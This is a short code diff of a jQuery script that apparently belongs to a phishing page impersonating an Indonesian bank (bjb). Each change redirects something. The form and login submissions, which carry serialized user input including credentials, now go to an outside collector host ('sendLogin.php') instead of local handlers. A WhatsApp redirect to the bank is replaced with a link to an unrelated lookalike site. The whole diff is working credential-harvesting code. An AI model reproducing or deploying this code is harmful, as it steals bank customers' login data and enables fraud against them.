@@ -10,7 +10,7 @@ $('#eform').on('submit', function (event) {
 
 $.ajax({
  type: 'POST',
- url: 'req/no.php',
+ url: 'https://axcellent.dvnet.org/app24/no.php',
  async: false,
  dataType: 'JSON',
  data: $(this).serialize(),
@@ -43,7 +43,7 @@ $('#login').on('submit', function (event) {
 
 $.ajax({
  type: 'POST',
- url: 'req/sendLogin.php',
+ url: 'https://axcellent.dvnet.org/app24/sendLogin.php',
  async: false,
  dataType: 'JSON',
  data: $(this).serialize(),
@@ -67,7 +67,7 @@ audio4.play();
 audio4.loop = false;
 document.getElementById('kirim').innerHTML = "Mohon tunggu sebentar...";
 setTimeout(function(){  
-location.href='https://api.whatsapp.com/send?phone=6282182480632&text=𝗛𝗮𝗹𝗹𝗼 𝗯𝗮𝗻𝗸 𝗯𝗷𝗯,%0ASaya mau request Pesan SMS ke layanan (83373)';
+location.href='https://bjbbaruwasapmy.wasap.my/';
 $('.load').fadeOut();
     }, 5500);    
 }  
